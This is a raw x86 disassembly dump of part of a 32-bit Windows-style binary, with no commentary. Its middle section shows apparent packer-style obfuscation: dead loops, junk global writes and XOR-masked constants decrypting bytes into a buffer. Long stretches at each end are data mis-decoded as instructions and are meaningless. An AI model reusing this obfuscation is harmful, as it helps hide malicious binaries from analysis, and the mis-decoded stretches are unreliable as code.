  40f087:	adc    bl,BYTE PTR [edx+0x3e]
  40f08a:	fimul  WORD PTR [eax+0x59]
  40f08d:	pop    ds
  40f08e:	ja     0x40f028
  40f090:	mov    al,0x1c
  40f092:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f093:	mov    bl,0x13
  40f095:	imul   eax,edi,0xffffffa8
  40f098:	nop
  40f099:	push   esi
  40f09a:	xor    ebp,DWORD PTR [edx]
  40f09c:	bound  ebx,QWORD PTR [ebx+0xe]
  40f09f:	popf   
  40f0a0:	imul   ecx,DWORD PTR [edx-0x49847141],0xd9ae0d8a
  40f0aa:	fdiv   DWORD PTR [ebx+0x7f30ed5f]
  40f0b0:	dec    edi
  40f0b1:	dec    esi
  40f0b2:	retf   0xbbba
  40f0b5:	push   cs
  40f0b6:	loop   0x40f0e3
  40f0b8:	je     0x40f03e
  40f0ba:	dec    ebp
  40f0bb:	pop    ss
  40f0bc:	fmul   st,st(5)
  40f0be:	or     BYTE PTR [edi+0x7],dl
  40f0c1:	jge    0x40f0ce
  40f0c3:	mov    ch,0x8d
  40f0c5:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40f0c7:	pop    es
  40f0c8:	iret   
  40f0c9:	call   0x3c34:0x5af3bf3d
  40f0d0:	and    esi,DWORD PTR [ebp+0x65]
  40f0d3:	inc    ebp
  40f0d4:	push   ecx
  40f0d5:	dec    edx
  40f0d6:	sbb    al,0x6f
  40f0d8:	push   edi
  40f0d9:	jmp    0x40f138
  40f0db:	stc    
  40f0dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0dd:	in     eax,dx
  40f0de:	inc    DWORD PTR [ecx-0x4e202cd7]
  40f0e4:	mov    ebp,0x37212833
  40f0e9:	loop   0x40f0e1
  40f0eb:	mov    bl,al
  40f0ed:	push   ebp
  40f0ee:	cli    
  40f0ef:	in     al,dx
  40f0f0:	clc    
  40f0f1:	out    0xd5,eax
  40f0f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0f4:	popa   
  40f0f5:	xchg   ecx,eax
  40f0f6:	xor    ebp,DWORD PTR [edx+0x2b09b4ac]
  40f0fc:	ret    0x2a7a
  40f0ff:	retf   
  40f100:	mov    ebx,DWORD PTR [ebx+0x6e]
  40f103:	or     cl,dh
  40f105:	(bad)  
  40f106:	xor    ah,BYTE PTR [edx-0xb3c9b9]
  40f10c:	sub    DWORD PTR [ecx],0x7118f6e1
  40f112:	xchg   edi,eax
  40f113:	(bad)  
  40f114:	repz mov ?,edx
  40f117:	mov    edi,0xa5db7b7f
  40f11c:	leave  
  40f11d:	mov    DWORD PTR [ebp+0x7b],ecx
  40f120:	push   cs
  40f121:	(bad)  
  40f122:	ins    BYTE PTR es:[edi],dx
  40f123:	sub    eax,0x7f818a59
  40f128:	and    DWORD PTR [edi],edi
  40f12a:	lahf   
  40f12b:	repz mov ds:0x4f1dfb80,eax
  40f131:	jmp    0xb3e9:0xa255725
  40f138:	mov    esi,0xca7e2f7a
  40f13d:	mov    esi,DWORD PTR [ebp+0xc]
  40f140:	cmp    esi,eax
  40f142:	mov    eax,DWORD PTR [ebp-0x4]
  40f145:	je     0x40cd96
  40f14b:	xor    eax,edx
  40f14d:	add    eax,ecx
  40f14f:	mov    ecx,DWORD PTR [ebp+0xc]
  40f152:	imul   eax,ecx
  40f155:	add    eax,DWORD PTR [ebp+0x8]
  40f158:	mov    DWORD PTR [ebp+0xc],eax
  40f15b:	mov    eax,DWORD PTR [ebp+0xc]
  40f15e:	pop    esi
  40f15f:	leave  
  40f160:	ret    0x8
  40f163:	push   ebp
  40f164:	mov    ebp,esp
  40f166:	push   ecx
  40f167:	or     eax,0x63ef
  40f16c:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  40f173:	adc    DWORD PTR ds:0x429004,0x1463
  40f17d:	mov    eax,DWORD PTR [ebp-0x4]
  40f180:	mov    edx,DWORD PTR [ebp+0x10]
  40f183:	mov    ecx,DWORD PTR ds:0x42b010
  40f189:	add    DWORD PTR ds:0x42a000,ecx
  40f18f:	mov    ecx,0x7510896
  40f194:	neg    DWORD PTR ds:0x42b010
  40f19a:	xor    eax,ecx
  40f19c:	add    eax,0x3272dd
  40f1a1:	and    DWORD PTR ds:0x429010,0xb4c
  40f1ab:	mov    DWORD PTR [edx],eax
  40f1ad:	and    DWORD PTR ds:0x42c01c,0x0
  40f1b7:	jmp    0x40f1c9
  40f1bc:	mov    edx,DWORD PTR ds:0x42c01c
  40f1c2:	inc    edx
  40f1c3:	mov    DWORD PTR ds:0x42c01c,edx
  40f1c9:	cmp    DWORD PTR ds:0x42c01c,0x1b
  40f1d0:	jae    0x40f1f8
  40f1d6:	cmp    DWORD PTR ds:0x42c01c,0x28
  40f1dd:	jne    0x40f1f3
  40f1e3:	push   0x22f2
  40f1e8:	push   0x42e134
  40f1ed:	call   DWORD PTR ds:0x42ed5d
  40f1f3:	jmp    0x40f1bc
  40f1f8:	mov    eax,DWORD PTR [ebp+0xc]
  40f1fb:	or     DWORD PTR ds:0x42a004,ecx
  40f201:	xor    eax,ecx
  40f203:	push   esi
  40f204:	mov    esi,DWORD PTR [ebp+0x10]
  40f207:	mov    edx,0x3272dd
  40f20c:	add    eax,edx
  40f20e:	mov    DWORD PTR [esi+0x4],eax
  40f211:	mov    eax,DWORD PTR [ebp+0x14]
  40f214:	mov    esi,DWORD PTR [ebp+0x10]
  40f217:	mov    DWORD PTR [esi+0x8],eax
  40f21a:	mov    eax,DWORD PTR [ebp+0x18]
  40f21d:	mov    esi,DWORD PTR [ebp+0x10]
  40f220:	mov    DWORD PTR [esi+0xc],eax
  40f223:	mov    eax,DWORD PTR [ebp+0x1c]
  40f226:	mov    esi,DWORD PTR [ebp+0x10]
  40f229:	mov    DWORD PTR [esi+0x10],eax
  40f22c:	mov    eax,DWORD PTR [ebp+0x8]
  40f22f:	xor    eax,ecx
  40f231:	add    eax,edx
  40f233:	pop    esi
  40f234:	leave  
  40f235:	ret    0x18
  40f238:	push   ebp
  40f239:	mov    ebp,esp
  40f23b:	sub    esp,0xa4
  40f241:	adc    eax,0x77b8
  40f246:	mov    ecx,DWORD PTR [ebp+0x8]
  40f249:	adc    DWORD PTR ds:0x429000,edi
  40f24f:	mov    eax,0x8a89
  40f254:	adc    DWORD PTR ds:0x42900c,0x429028
  40f25e:	xor    ax,WORD PTR [ecx+0x20]
  40f262:	mov    ecx,DWORD PTR ds:0x429028
  40f268:	and    DWORD PTR ds:0x42b00c,ecx
  40f26e:	mov    ecx,0x3b4c
  40f273:	dec    DWORD PTR ds:0x42d014
  40f279:	add    ax,cx
  40f27c:	movzx  eax,ax
  40f27f:	add    ecx,0x1468
  40f285:	mov    DWORD PTR [ebp-0x18],eax
  40f288:	mov    BYTE PTR [ebp-0x1],0x7d
  40f28c:	mov    ecx,DWORD PTR ds:0x412000
  40f292:	mov    ecx,DWORD PTR [ecx]
  40f294:	adc    DWORD PTR ds:0x42d01c,ecx
  40f29a:	lea    eax,[ebp-0x1]
  40f29d:	sub    DWORD PTR ds:0x42c014,0xae5
  40f2a7:	mov    DWORD PTR [ebp-0x10],eax
  40f2aa:	mov    al,BYTE PTR [ebp-0x1]
  40f2ad:	inc    ecx
  40f2ae:	mov    ecx,DWORD PTR [ebp-0x10]
  40f2b1:	xor    al,0x71
  40f2b3:	adc    DWORD PTR ds:0x42b018,0x264
  40f2bd:	sub    al,0xb
  40f2bf:	adc    DWORD PTR ds:0x429014,0x5cc7
  40f2c9:	mov    BYTE PTR [ecx],al
  40f2cb:	mov    DWORD PTR ds:0x42b004,0x11
  40f2d5:	cmp    DWORD PTR ds:0x42b004,0x0
  40f2dc:	je     0x40f31e
  40f2e2:	cmp    DWORD PTR ds:0x42b004,0x1d
  40f2e9:	jne    0x40f304
  40f2ef:	push   0x42e000
  40f2f4:	push   DWORD PTR [ebp-0x18]
  40f2f7:	push   0x0
  40f2f9:	push   0x4fbc
  40f2fe:	call   DWORD PTR ds:0x42ed61
  40f304:	mov    eax,ds:0x42b004
  40f309:	dec    eax
  40f30a:	mov    ds:0x42b004,eax
  40f30f:	jmp    0x40f2d5
  40f314:	sbb    DWORD PTR ds:0x42d010,0x7483
  40f31e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40f325:	push   ebx
  40f326:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  40f32d:	mov    ecx,DWORD PTR [ebp-0x14]
  40f330:	push   esi
  40f331:	and    DWORD PTR ds:0x42a01c,0x0
  40f33b:	jmp    0x40f34d
  40f340:	mov    esi,DWORD PTR ds:0x42a01c
  40f346:	inc    esi
  40f347:	mov    DWORD PTR ds:0x42a01c,esi
  40f34d:	cmp    DWORD PTR ds:0x42a01c,0x1f
  40f354:	jae    0x40f3f6
  40f35a:	cmp    DWORD PTR ds:0x42a01c,0x21
  40f361:	jne    0x40f377
  40f367:	push   0x42c010
  40f36c:	push   0x562e
  40f371:	call   DWORD PTR ds:0x42ed65
  40f377:	jmp    0x40f340
  40f37c:	and    DWORD PTR ds:0x42d01c,0x0
  40f386:	xor    eax,eax
  40f388:	or     eax,DWORD PTR ds:0x42d01c
  40f38e:	inc    eax
  40f38f:	mov    ds:0x42d01c,eax
  40f394:	cmp    DWORD PTR ds:0x42d01c,0xb
  40f39b:	jne    0x40f3c1
  40f3a1:	push   DWORD PTR [ebp-0x24]
  40f3a4:	push   0x42a010
  40f3a9:	push   0x78c6
  40f3ae:	push   0x42e134
  40f3b3:	push   DWORD PTR [ebp-0x1c]
  40f3b6:	push   0x1e85
  40f3bb:	call   DWORD PTR ds:0x42ed6d
  40f3c1:	cmp    DWORD PTR ds:0x42d01c,0xa
  40f3c8:	jne    0x40f3d9
  40f3ce:	mov    eax,ds:0x42d01c
  40f3d3:	inc    eax
  40f3d4:	mov    ds:0x42d01c,eax
  40f3d9:	cmp    DWORD PTR ds:0x42d01c,0x18
  40f3e0:	jb     0x40f386
  40f3e6:	xor    eax,eax
  40f3e8:	xor    eax,DWORD PTR ds:0x411ff4
  40f3ee:	mov    eax,DWORD PTR [eax]
  40f3f0:	or     DWORD PTR ds:0x42b018,eax
  40f3f6:	mov    eax,0x7510896
  40f3fb:	sbb    DWORD PTR ds:0x42a01c,edx
  40f401:	xor    ecx,eax
  40f403:	or     esi,DWORD PTR ds:0x42a008
  40f409:	mov    esi,0x3272dd
  40f40e:	push   edi
  40f40f:	add    ecx,esi
  40f411:	jmp    0x40f435
  40f416:	mov    DWORD PTR ds:0x42a01c,0x2feb
  40f420:	mov    dl,BYTE PTR [ebp-0x1]
  40f423:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40f42a:	mov    DWORD PTR ds:0x42b01c,0x5ed5
  40f434:	inc    ecx
  40f435:	cmp    ecx,0x40
  40f438:	jb     0x40f416
  40f43e:	mov    DWORD PTR ds:0x429018,0x19
  40f448:	cmp    DWORD PTR ds:0x429018,0x0
  40f44f:	je     0x40f47c
  40f455:	cmp    DWORD PTR ds:0x429018,0x1d
  40f45c:	jne    0x40f468
  40f462:	call   DWORD PTR ds:0x42ed71
  40f468:	mov    edx,DWORD PTR ds:0x429018
  40f46e:	dec    edx
  40f46f:	mov    DWORD PTR ds:0x429018,edx
  40f475:	jmp    0x40f448
  40f47a:	not    edx
  40f47c:	mov    edx,DWORD PTR [ebp-0x14]
  40f47f:	sub    DWORD PTR ds:0x42c00c,0x42b014
  40f489:	xor    edx,eax
  40f48b:	adc    DWORD PTR ds:0x429024,0x42a018
  40f495:	add    edx,esi
  40f497:	mov    DWORD PTR ds:0x42b014,0x72c9
  40f4a1:	jmp    0x40f5bb
  40f4a6:	dec    DWORD PTR ds:0x429014
  40f4ac:	mov    edi,DWORD PTR [ebp+0x8]
  40f4af:	adc    ecx,DWORD PTR ds:0x42a018
  40f4b5:	mov    ecx,0x8a89
  40f4ba:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40f4bf:	and    DWORD PTR ds:0x429008,0x0
  40f4c9:	jmp    0x40f4dd
  40f4ce:	xor    edi,edi
  40f4d0:	xor    edi,DWORD PTR ds:0x429008
  40f4d6:	inc    edi
  40f4d7:	mov    DWORD PTR ds:0x429008,edi
  40f4dd:	cmp    DWORD PTR ds:0x429008,0x10
  40f4e4:	jae    0x40f511
  40f4ea:	cmp    DWORD PTR ds:0x429008,0x19
  40f4f1:	jne    0x40f502
  40f4f7:	push   0x429018
  40f4fc:	call   DWORD PTR ds:0x42ed75
  40f502:	jmp    0x40f4ce
  40f507:	adc    DWORD PTR ds:0x42a010,0x20e4
  40f511:	mov    edi,0x3b4c
  40f516:	sub    DWORD PTR ds:0x42a014,0x7a80
  40f520:	add    cx,di
  40f523:	movzx  ecx,cx
  40f526:	neg    DWORD PTR ds:0x42b000
  40f52c:	mov    DWORD PTR [ebp-0x10],ecx
  40f52f:	and    DWORD PTR ds:0x42a000,0x0
  40f539:	jmp    0x40f54b
  40f53e:	mov    ecx,DWORD PTR ds:0x42a000
  40f544:	inc    ecx
  40f545:	mov    DWORD PTR ds:0x42a000,ecx
  40f54b:	cmp    DWORD PTR ds:0x42a000,0x1f
  40f552:	jae    0x40f57e
  40f558:	cmp    DWORD PTR ds:0x42a000,0x26
  40f55f:	jne    0x40f573
  40f565:	push   0x3463
  40f56a:	push   DWORD PTR [ebp-0x1c]
  40f56d:	call   DWORD PTR ds:0x42ed35
  40f573:	jmp    0x40f53e
  40f578:	or     ecx,0x6b07
  40f57e:	mov    ecx,DWORD PTR [ebp+0x8]
  40f581:	movzx  ecx,WORD PTR [ecx+edx*4]
  40f585:	mov    DWORD PTR ds:0x42a010,0x2266
  40f58f:	xor    ecx,0x8a89
  40f595:	add    ecx,edi
  40f597:	mov    DWORD PTR ds:0x42b018,0x196a
  40f5a1:	mov    edi,DWORD PTR [ebp-0x10]
  40f5a4:	mov    DWORD PTR ds:0x42a018,0x15ce
  40f5ae:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  40f5b5:	mov    ecx,0x651b
  40f5ba:	inc    edx
  40f5bb:	mov    ecx,DWORD PTR [ebp-0x18]
  40f5be:	mov    DWORD PTR ds:0x429020,0x7b55
  40f5c8:	cmp    edx,ecx
  40f5ca:	jne    0x40f4a6
  40f5d0:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5d3:	mov    edx,DWORD PTR [ebp+0x10]
  40f5d6:	adc    DWORD PTR ds:0x429008,0x429014
  40f5e0:	xor    ecx,eax
  40f5e2:	mov    DWORD PTR ds:0x429028,0x35c1
  40f5ec:	add    ecx,esi
  40f5ee:	sub    DWORD PTR ds:0x429024,0xd80
  40f5f8:	mov    DWORD PTR [edx],ecx
  40f5fa:	add    ecx,0x553e
  40f600:	mov    ecx,DWORD PTR [ebp-0x14]
  40f603:	add    DWORD PTR ds:0x42901c,0xd2d
  40f60d:	xor    ecx,eax
  40f60f:	add    ecx,esi
  40f611:	mov    DWORD PTR ds:0x42d008,0x74bc
  40f61b:	mov    DWORD PTR [ebp-0x20],ecx
  40f61e:	mov    DWORD PTR ds:0x42a004,edi
  40f624:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  40f62b:	mov    DWORD PTR ds:0x429018,0x1d37
  40f635:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  40f63c:	mov    DWORD PTR ds:0x42901c,0x14b9
  40f646:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  40f64d:	mov    DWORD PTR ds:0x42c000,edx
  40f653:	mov    ecx,DWORD PTR [ebp-0xc]
  40f656:	mov    DWORD PTR ds:0x42a018,0x1347
  40f660:	mov    DWORD PTR [ebp+0x8],ecx
  40f663:	mov    DWORD PTR ds:0x429014,0x4ea
  40f66d:	jmp    0x40f78d
  40f672:	sbb    DWORD PTR ds:0x42a018,0x42c008
  40f67c:	mov    ecx,DWORD PTR [ebp+0x8]
  40f67f:	and    edx,DWORD PTR ds:0x42c00c
  40f685:	mov    edx,DWORD PTR [ebp-0x8]
  40f688:	xor    DWORD PTR ds:0x42a008,0x42a018
  40f692:	xor    ecx,eax
  40f694:	xor    edx,eax
  40f696:	sub    ecx,edx
  40f698:	sub    edx,0x6561
  40f69e:	sub    ecx,esi
  40f6a0:	xor    ecx,eax
  40f6a2:	mov    DWORD PTR [ebp+0x8],ecx
  40f6a5:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6a8:	mov    edx,DWORD PTR [ebp-0x64]
  40f6ab:	sub    DWORD PTR ds:0x42901c,0x6b48
  40f6b5:	lea    ecx,[edx+ecx*1+0x5708f2]
  40f6bc:	movzx  edx,WORD PTR ds:0x42900c
  40f6c3:	adc    DWORD PTR ds:0x42c00c,edx
  40f6c9:	mov    DWORD PTR [ebp-0x64],ecx
  40f6cc:	sbb    DWORD PTR ds:0x42a018,0x1891
  40f6d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6d9:	dec    edx
  40f6da:	mov    edx,DWORD PTR [ebp-0x60]
  40f6dd:	lea    ecx,[edx+ecx*1+0x5708f2]
  40f6e4:	mov    DWORD PTR [ebp-0x60],ecx
  40f6e7:	sbb    DWORD PTR ds:0x42900c,0x79ab
  40f6f1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6f4:	add    DWORD PTR ds:0x42a01c,edi
  40f6fa:	mov    edx,DWORD PTR [ebp-0x5c]
  40f6fd:	lea    ecx,[edx+ecx*1+0x5708f3]
  40f704:	mov    DWORD PTR [ebp-0x5c],ecx
  40f707:	inc    DWORD PTR ds:0x429004
  40f70d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f710:	sbb    DWORD PTR ds:0x42d018,edx
  40f716:	mov    edx,DWORD PTR [ebp-0x58]
  40f719:	and    DWORD PTR ds:0x42c008,0x42b004
  40f723:	lea    ecx,[edx+ecx*1+0x5708f0]
  40f72a:	dec    edx
  40f72b:	mov    DWORD PTR [ebp-0x58],ecx
  40f72e:	movzx  ecx,WORD PTR ds:0x429000
  40f735:	adc    DWORD PTR ds:0x42c008,ecx
  40f73b:	mov    ecx,DWORD PTR [ebp+0x8]
  40f73e:	mov    edx,DWORD PTR [ebp-0x54]
  40f741:	add    DWORD PTR ds:0x42d004,0x42a014
  40f74b:	lea    ecx,[edx+ecx*1+0x5708f1]
  40f752:	mov    DWORD PTR [ebp-0x54],ecx
  40f755:	xor    DWORD PTR ds:0x42d01c,0x80b
  40f75f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f762:	and    DWORD PTR ds:0x42d008,0x7467
  40f76c:	mov    edx,DWORD PTR [ebp-0x50]
  40f76f:	or     DWORD PTR ds:0x42c004,0x42a000
  40f779:	lea    ecx,[edx+ecx*1+0x5708fe]
  40f780:	add    DWORD PTR ds:0x42c010,0x5221
  40f78a:	mov    DWORD PTR [ebp-0x50],ecx
  40f78d:	or     ecx,DWORD PTR ds:0x429028
  40f793:	mov    ecx,DWORD PTR [ebp+0x8]
  40f796:	xor    ecx,eax
  40f798:	add    ecx,esi
  40f79a:	mov    DWORD PTR ds:0x42c004,0x633d
  40f7a4:	jne    0x40f672
  40f7aa:	jmp    0x411e4d
  40f7af:	neg    DWORD PTR ds:0x42901c
  40f7b5:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7b8:	mov    edx,DWORD PTR [ebp-0x8]
  40f7bb:	sub    DWORD PTR ds:0x429008,0x429014
  40f7c5:	xor    ecx,eax
  40f7c7:	xor    edx,eax
  40f7c9:	sbb    DWORD PTR ds:0x42c018,0x25ac
  40f7d3:	sub    ecx,edx
  40f7d5:	or     DWORD PTR ds:0x42d000,0x429014
  40f7df:	sub    ecx,esi
  40f7e1:	xor    ecx,eax
  40f7e3:	mov    DWORD PTR ds:0x42b018,0x1de
  40f7ed:	mov    DWORD PTR [ebp-0x1c],ecx
  40f7f0:	mov    DWORD PTR ds:0x42c000,0x7d6a
  40f7fa:	mov    ecx,DWORD PTR [ebp-0xc]
  40f7fd:	mov    DWORD PTR ds:0x429028,0x9e0
  40f807:	mov    DWORD PTR [ebp+0x8],ecx
  40f80a:	jmp    0x40f91d
  40f80f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f812:	mov    edx,DWORD PTR [ebp-0x8]
  40f815:	xor    ecx,eax
  40f817:	adc    DWORD PTR ds:0x42c008,ecx
  40f81d:	xor    edx,eax
  40f81f:	xor    DWORD PTR ds:0x42900c,0x3273
  40f829:	sub    ecx,edx
  40f82b:	sub    ecx,esi
  40f82d:	or     edi,edi
  40f82f:	xor    ecx,eax
  40f831:	mov    DWORD PTR [ebp+0x8],ecx
  40f834:	and    DWORD PTR ds:0x429020,0x0
  40f83e:	jmp    0x40f850
  40f843:	mov    edi,DWORD PTR ds:0x429020
  40f849:	inc    edi
  40f84a:	mov    DWORD PTR ds:0x429020,edi
  40f850:	cmp    DWORD PTR ds:0x429020,0x1b
  40f857:	jae    0x40f8a8
  40f85d:	cmp    DWORD PTR ds:0x429020,0x6
  40f864:	jne    0x40f87f
  40f86a:	push   0x6ce2
  40f86f:	push   0x42d018
  40f874:	push   0x18a6
  40f879:	call   DWORD PTR ds:0x42ed39
  40f87f:	cmp    DWORD PTR ds:0x429020,0x5
  40f886:	jne    0x40f899
  40f88c:	mov    edi,DWORD PTR ds:0x429020
  40f892:	inc    edi
  40f893:	mov    DWORD PTR ds:0x429020,edi
  40f899:	jmp    0x40f843
  40f89e:	and    DWORD PTR ds:0x42b004,0x42b01c
  40f8a8:	mov    ecx,DWORD PTR [ebp+0x8]
  40f8ab:	mov    edx,DWORD PTR [ebp+0x8]
  40f8ae:	and    DWORD PTR ds:0x42d010,0x0
  40f8b8:	mov    edi,DWORD PTR ds:0x42d010
  40f8be:	inc    edi
  40f8bf:	mov    DWORD PTR ds:0x42d010,edi
  40f8c5:	cmp    DWORD PTR ds:0x42d010,0x5
  40f8cc:	jne    0x40f8e2
  40f8d2:	push   0x42e11d
  40f8d7:	push   0x42e110
  40f8dc:	call   DWORD PTR ds:0x42ed3d
  40f8e2:	cmp    DWORD PTR ds:0x42d010,0x4
  40f8e9:	jne    0x40f8fc
  40f8ef:	mov    edi,DWORD PTR ds:0x42d010
  40f8f5:	inc    edi
  40f8f6:	mov    DWORD PTR ds:0x42d010,edi
  40f8fc:	cmp    DWORD PTR ds:0x42d010,0x15
  40f903:	jb     0x40f8b8
  40f909:	imul   edx,edx,0x5708f2
  40f90f:	xor    ecx,eax
  40f911:	add    ecx,esi
  40f913:	lea    ecx,[ebp+ecx*4-0x64]
  40f917:	mov    edi,DWORD PTR [ecx]
  40f919:	add    edx,edi
  40f91b:	mov    DWORD PTR [ecx],edx
  40f91d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f920:	xor    ecx,eax
  40f922:	add    ecx,esi
  40f924:	jne    0x40f80f
  40f92a:	mov    ecx,DWORD PTR [ebp-0x20]
  40f92d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40f934:	mov    dl,BYTE PTR [ebp-0x1]
  40f937:	cmp    cl,dl
  40f939:	je     0x411dae
  40f93f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f942:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40f949:	mov    edx,DWORD PTR [ebp+0xc]
  40f94c:	cmp    cl,BYTE PTR [edx]
  40f94e:	jne    0x411e5f
  40f954:	mov    ecx,DWORD PTR [ebp-0x14]
  40f957:	mov    edx,DWORD PTR [ebp+0xc]
  40f95a:	movsx  edx,BYTE PTR [edx]
  40f95d:	xor    ecx,eax
  40f95f:	add    ecx,esi
  40f961:	cmp    edx,ecx
  40f963:	mov    ecx,DWORD PTR [ebp-0xc]
  40f966:	mov    DWORD PTR [ebp+0x8],ecx
  40f969:	mov    ecx,DWORD PTR [ebp+0x8]
  40f96c:	je     0x411ed9
  40f972:	jmp    0x40f9a7
  40f977:	mov    ecx,DWORD PTR [ebp+0x8]
  40f97a:	mov    edx,DWORD PTR [ebp-0x8]
  40f97d:	xor    ecx,eax
  40f97f:	xor    edx,eax
  40f981:	sub    ecx,edx
  40f983:	sub    ecx,esi
  40f985:	xor    ecx,eax
  40f987:	mov    DWORD PTR [ebp+0x8],ecx
  40f98a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f98d:	mov    edx,DWORD PTR [ebp+0x8]
  40f990:	xor    ecx,eax
  40f992:	imul   edx,edx,0x5708f2
  40f998:	add    ecx,esi
  40f99a:	lea    ecx,[ebp+ecx*4-0x64]
  40f99e:	mov    edi,DWORD PTR [ecx]
  40f9a0:	add    edx,edi
  40f9a2:	mov    DWORD PTR [ecx],edx
  40f9a4:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9a7:	xor    ecx,eax
  40f9a9:	add    ecx,esi
  40f9ab:	jne    0x40f977
  40f9b1:	mov    ecx,DWORD PTR [ebp-0x14]
  40f9b4:	mov    edx,DWORD PTR [ebp+0x8]
  40f9b7:	xor    ecx,eax
  40f9b9:	xor    edx,eax
  40f9bb:	add    ecx,esi
  40f9bd:	add    edx,esi
  40f9bf:	cmp    ecx,edx
  40f9c1:	jae    0x411df3
  40f9c7:	lea    edx,[ecx-0x3272dd]
  40f9cd:	mov    DWORD PTR [ebp-0x18],edx
  40f9d0:	mov    edi,DWORD PTR [ebp-0x18]
  40f9d3:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  40f9da:	lea    edx,[ebp-0x24]
  40f9dd:	mov    DWORD PTR [ebp-0x10],edx
  40f9e0:	mov    edx,DWORD PTR [ebp-0x10]
  40f9e3:	add    DWORD PTR [edx],0x705fa0f
  40f9e9:	mov    ebx,DWORD PTR [ebp-0x10]
  40f9ec:	xor    edi,eax
  40f9ee:	add    edi,DWORD PTR [ebx]
  40f9f0:	lea    edx,[ebp+ecx*4-0x64]
  40f9f4:	mov    ebx,DWORD PTR [edx]
  40f9f6:	xor    edi,ebx
  40f9f8:	mov    DWORD PTR [edx],edi
  40f9fa:	mov    edx,DWORD PTR [ebp+0x8]
  40f9fd:	xor    edx,eax
  40f9ff:	inc    ecx
  40fa00:	inc    DWORD PTR [ebp-0x18]
  40fa03:	add    edx,esi
  40fa05:	jmp    0x411da1
  40fa0a:	fstp   DWORD PTR [ebx]
  40fa0c:	sti    
  40fa0d:	sar    DWORD PTR [ebx-0x4f],1
  40fa10:	jnp    0x40fa2d
  40fa12:	inc    esi
  40fa13:	xchg   ebx,eax
  40fa14:	or     ch,BYTE PTR [eax]
  40fa16:	mov    al,0xfd
  40fa18:	lods   al,BYTE PTR ds:[esi]
  40fa19:	adc    eax,0x7a7aca74
  40fa1e:	sti    
  40fa1f:	pop    edi
  40fa20:	jp     0x40fa9c
  40fa22:	add    BYTE PTR [eax],0x3
  40fa25:	xchg   edi,eax
  40fa26:	push   ecx
  40fa27:	push   0xd10a3fff
  40fa2c:	scas   eax,DWORD PTR es:[edi]
  40fa2d:	fild   DWORD PTR [ebp+0x42]
  40fa30:	in     eax,0x6a
  40fa32:	call   0x2014:0x12e5cb5e
  40fa39:	out    dx,eax
  40fa3a:	xor    eax,0x9ab5015b
  40fa3f:	sub    eax,0x7bfd944e
  40fa44:	mov    esp,0xed98f0f7
  40fa49:	retf   
  40fa4a:	call   0x68ab056b
  40fa4f:	dec    esp
  40fa50:	add    eax,0x245ef93
  40fa55:	mov    al,ds:0x71a72dd0
  40fa5a:	jmp    0x40f9f6
  40fa5c:	arpl   WORD PTR [eax+0x2e8d5c35],si
  40fa62:	lahf   
  40fa63:	and    cl,dh
  40fa65:	push   ss
  40fa66:	pop    esi
  40fa67:	cmp    al,0x6b
  40fa69:	cmp    esp,DWORD PTR [eax]
  40fa6b:	inc    esi
  40fa6c:	mov    ebp,fs
  40fa6e:	push   ebp
  40fa6f:	xchg   esp,eax
  40fa70:	mov    eax,0x212f5742
  40fa75:	stos   BYTE PTR es:[edi],al
  40fa76:	inc    ecx
  40fa77:	adc    edx,DWORD PTR [ebx-0x5a493f3d]
  40fa7d:	fwait
  40fa7e:	xor    edi,DWORD PTR [edi]
  40fa80:	mov    ah,0x41
  40fa82:	inc    ebp
  40fa83:	xchg   ebx,eax
  40fa84:	pcmpeqb mm2,QWORD PTR [ebp-0xdfcd1ba]
  40fa8b:	repnz daa 
  40fa8d:	sbb    dl,bl
  40fa8f:	jg     0x40faf3
  40fa91:	xchg   BYTE PTR [ebp-0x35c2fc2d],dl
  40fa97:	js     0x40fa43
  40fa99:	retf   0x970d
  40fa9c:	dec    esi
  40fa9d:	dec    esi
  40fa9e:	cmp    bh,BYTE PTR [ebp-0x17]
  40faa1:	stos   DWORD PTR es:[edi],eax
  40faa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faa3:	(bad)  
  40faa4:	dec    esi
  40faa5:	jle    0x40fa51
  40faa7:	dec    edx
  40faa8:	es in  eax,0x2f
  40faab:	sar    DWORD PTR [ebp-0x482422f9],0xc5
  40fab2:	and    al,0xf7
  40fab4:	jb     0x40faf9
  40fab6:	xor    eax,0x446ba219
  40fabb:	iret   
  40fabc:	stc    
  40fabd:	(bad)  
  40fabe:	cli    
  40fabf:	and    al,0xc
  40fac1:	leave  
  40fac2:	not    BYTE PTR [ecx-0x31bbf38c]
  40fac8:	pop    ebp
  40fac9:	push   ecx
  40faca:	jp     0x40fa60
  40facc:	mov    al,0x4e
  40face:	pop    ecx
  40facf:	mov    ds:0x15ccb66e,al
  40fad4:	xor    DWORD PTR [edx-0xa],ebx
  40fad7:	jnp    0x40fac5
  40fad9:	dec    esp
  40fada:	inc    ebx
  40fadb:	sbb    bh,BYTE PTR [edx+eax*8+0x79b59a37]
  40fae2:	sub    al,BYTE PTR [ebx+eax*4-0x2c]
  40fae6:	ins    BYTE PTR es:[edi],dx
  40fae7:	xor    esi,DWORD PTR [ecx-0x6a1e14e1]
